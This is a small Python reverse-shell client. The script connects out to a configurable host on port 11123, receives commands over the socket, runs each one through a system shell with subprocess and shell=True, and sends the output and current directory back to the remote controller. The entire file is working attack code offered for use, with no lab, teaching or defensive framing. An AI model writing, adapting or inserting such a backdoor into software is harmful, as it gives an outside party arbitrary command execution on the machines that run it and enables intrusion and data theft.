import socket
import os
import subprocess

# manual edit required
host = ""
port = 11123

try:
    # socket creation and connection
    s = socket.socket()
    s.connect((host, port))
except Exception as e:
    print(f"Error: {e}")

while True:
    try:
        cmd = s.recv(8).decode("utf-8")
    except Exception as e:
        # avoiding unwanted error
        cmd = ""
    if cmd == "quit":
        # exiting client
        print(f"Command: {cmd}")
        break
    while len(cmd) > 0:
        # receiving and accumulating full command
        s.settimeout(0.25)  # avoiding unwanted wait
        try:
            # receives part of command
            cmd_part = s.recv(8).decode("utf-8")
        except Exception as e:
            # avoids unwanted error
            cmd_part = ""
        if len(cmd_part) <= 0:
            break
        cmd += cmd_part  # accumulates command
    if len(cmd) > 0:
        # processing valid command string
        print(f"Command: {cmd}")
        # opens shell and executes command
        cmdShell = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        if cmd[:2] == "cd" and cmd[3:] != "":
            try:
                # changes directory
                os.chdir(cmd[3:])
            except Exception as e:
                print(f"Direcory changing error: {e}")
        # output and error from shell
        outputStr = (cmdShell.stdout.read() +
                     cmdShell.stderr.read()).decode("utf-8")
        currWd = os.getcwd()+"> "  # current client directory
        # sends client output, error and current directory info
        s.send(str.encode(outputStr+currWd, "utf-8"))
        print(outputStr)

s.close()
